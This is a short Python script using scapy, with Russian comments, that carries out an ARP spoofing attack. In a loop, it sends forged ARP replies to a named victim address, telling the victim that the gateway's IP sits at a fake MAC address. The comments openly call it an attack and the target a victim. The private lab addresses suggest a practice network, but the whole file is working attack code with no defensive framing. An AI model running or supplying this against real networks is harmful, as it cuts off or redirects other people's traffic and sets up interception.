from scapy.all import ARP, Ether, sendp
import time

# Настройки для атаки (подставь свои значения)
target_ip = "192.168.99.4"            # IP жертвы
target_mac = "08:00:27:41:d9:3a"      # MAC жертвы
gateway_ip = "192.168.99.1"           # IP шлюза
fake_mac = "aa:bb:cc:dd:ee:ff"        # Фейковый MAC, который мы подставляем

# Формируем пакет для жертвы: говорим ей, что мы — шлюз
packet = Ether(dst=target_mac) / ARP(
    op=2,                             # ARP-ответ (Reply)
    pdst=target_ip,                   # Кому отправляем (жертва)
    hwdst=target_mac,                 # MAC получателя (жертва)
    psrc=gateway_ip,                  # От чьего имени (IP шлюза)
    hwsrc=fake_mac                    # Какой MAC подставляем (фейковый)
)

print("[+] Атака запущена: жертва думает, что шлюз - это мы.")

try:
    while True:
        sendp(packet, verbose=False)  # Отправляем пакет на канальном уровне
        time.sleep(1)                 # Пауза, чтобы не заспамить сеть
except KeyboardInterrupt:
    print("\n[!] Атака остановлена.")